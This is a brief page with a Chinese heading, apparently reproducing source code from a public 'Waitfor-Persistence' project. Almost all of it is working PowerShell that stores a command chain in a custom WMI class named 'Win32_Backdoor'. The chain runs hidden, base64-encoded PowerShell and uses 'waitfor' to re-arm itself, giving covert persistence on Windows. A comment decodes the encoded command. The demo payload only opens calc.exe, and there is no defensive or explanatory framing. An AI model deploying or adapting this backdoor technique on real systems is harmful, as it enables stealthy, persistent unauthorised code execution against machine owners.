## Waitfor 源码

[项目地址](https://github.com/3gstudent/Waitfor-Persistence)

```powershell
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()| Out-Null
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&```& taskkill /f /im powershell.exe ```&```& waitfor persist ```&```& powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
<# 
	base64 解码为
	`$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec`
#>
$StaticClass.Put() | Out-Null

$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec | Out-Null
```















